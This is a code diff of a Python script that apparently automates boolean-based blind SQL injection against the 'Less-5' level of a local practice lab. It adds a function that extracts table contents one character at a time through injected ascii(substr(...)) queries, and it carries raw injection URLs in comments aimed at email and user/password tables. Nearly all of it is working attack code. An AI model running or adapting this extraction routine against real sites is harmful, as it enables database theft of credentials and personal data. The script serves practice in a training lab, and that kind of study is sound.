@@ -234,7 +234,7 @@ def get_data_len(table_and_column_dict: Dict[str, List[str]], table_and_data_num
             while limit_begin_index < data_num:
                 url_str: str = f"/Less-5/?id=1' and length((select {column_name} from {table_name} limit {limit_begin_index},1)) = {data_len}"
                 url_str = LAB_ROOT_URL + url_str + SQL_COMMENT
-                print(f'Try to get the data lenght: {url_str}')
+                print(f'Try to get the data length: {url_str}')
                 if get_method(url=url_str, pattern=pattern):
                     limit_begin_index = limit_begin_index + 1
                     data_len_list.append(data_len)
@@ -245,9 +245,40 @@ def get_data_len(table_and_column_dict: Dict[str, List[str]], table_and_data_num
         data_len_dict[table_name] = column_and_data_len_dict
     return data_len_dict
 
-def get_data() -> None:
-    url_str: str = f"http://localhost:8001/Less-5/?id=1' and ascii(substr((select email_id from emails limit 0,1), 1,1))='68'--+"
-    pass
+# TODO
+def get_data(table_column_data_len_dict: Dict[str, Dict[str, List[int]]], pattern: str) -> Dict[str, Dict[str, List[str]]]:
+    table_column_data_dict: Dict[str, Dict[str, List[str]]] = {}
+    for table_name, column_and_data_len_dict in table_column_data_len_dict.items():
+        column_data_dict: Dict[str, List[str]] = {}
+        for column_name, data_len_list in column_and_data_len_dict.items():
+            data_str_list: List[str] = []
+            for data_len in data_len_list:
+                data_str: str = ''
+                data_char_ascii_index: int = 0
+                if data_char_ascii_index > len(all_char_ascii_sorted_list):
+                    print(f'Error: not found the char in all_char_ascii_sorted_list')
+                else:
+                    # data_char_ascii: int = all_char_ascii_sorted_list[data_char_ascii_index]
+                    limit_begin_index: int = 0
+                    substr_begin_index: int = 1
+                    while len(data_str) < data_len:
+                        data_char_ascii: int = all_char_ascii_sorted_list[data_char_ascii_index]
+                        # /Less-5/?id=1' and ascii(substr((select email_id from emails limit 0,1), 1,1))='68'--+
+                        url_str: str = f"/Less-5/?id=1' and ascii(substr((select {column_name} from {table_name} limit {limit_begin_index},1), {substr_begin_index},1))='{data_char_ascii}'--+"
+                        url_str = LAB_ROOT_URL + url_str + SQL_COMMENT
+                        print(f'Try to get the data: {url_str}')
+                        time.sleep(2)
+                        if get_method(url=url_str, pattern=pattern):
+                            data_str = data_str + chr(data_char_ascii)
+                            substr_begin_index = substr_begin_index + 1
+                            data_char_ascii_index = 0
+                            continue
+                        data_char_ascii_index = data_char_ascii_index + 1
+                data_str_list.append(data_str)
+                limit_begin_index = limit_begin_index + 1
+            column_data_dict[column_name] = data_str_list
+        table_column_data_dict[table_name] = column_data_dict
+    return table_column_data_dict
 
 # Decoded URL: ?id=1' and ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20) FROM security.users ORDER BY id LIMIT 0,1),1,1))=68--+
 # print(f"Decoded URL: {url_decoder("?id=1%27%20and%20ORD(MID((SELECT%20IFNULL(CAST(username%20AS%20CHAR),0x20)FROM%20security.users%20ORDER%20BY%20id%20LIMIT%200,1),1,1))=68--+")}")
@@ -274,15 +305,15 @@ print(f'The column num dict: {column_num_dict}\n\n')
 table_and_column_info_dict: Dict[str, Dict[int, List[int]]] = get_table_and_column_info(column_num_dict=column_num_dict, pattern='You are in')
 print(f'The column name len dict: {table_and_column_info_dict}\n\n')
 
-table_and_column_dict: Dict[str, List[str]] = get_column_name(pattern='You are in', table_and_column_info_dict=table_and_column_info_dict)
 # {'emails': ['id', 'email_id'], 
 # 'referers': ['id', 'referer', 'ip_address'], 
 # 'uagents': ['id', 'uagent', 'ip_address', 'username'], 
 # 'users': ['id', 'username', 'password']}
+table_and_column_dict: Dict[str, List[str]] = get_column_name(pattern='You are in', table_and_column_info_dict=table_and_column_info_dict)
 print(f'The table name and column name dict: {table_and_column_dict}\n\n')
 
-table_and_data_num_dict: Dict[str, int] = get_data_num(table_and_column_dict=table_and_column_dict, pattern='You are in')
 # The data num list: {'emails': 8, 'referers': 0, 'uagents': 0, 'users': 13}
+table_and_data_num_dict: Dict[str, int] = get_data_num(table_and_column_dict=table_and_column_dict, pattern='You are in')
 print(f'The data num list: {table_and_data_num_dict}\n\n')
 
 # table name: emails
@@ -306,3 +337,7 @@ for table_name, column_and_data_len_dict in table_column_data_len_dict.items():
     print(f'table name: {table_name}')
     for column_name, data_len_list in column_and_data_len_dict.items():
         print(f'\tcolumn name: {column_name}, data length list: {data_len_list}')
+print('\n\n')
+
+table_column_data_dict: Dict[str, Dict[str, List[str]]] = get_data(table_column_data_len_dict=table_column_data_len_dict, pattern='You are in')
+print(f'The table, column and data dict: {table_column_data_dict}')
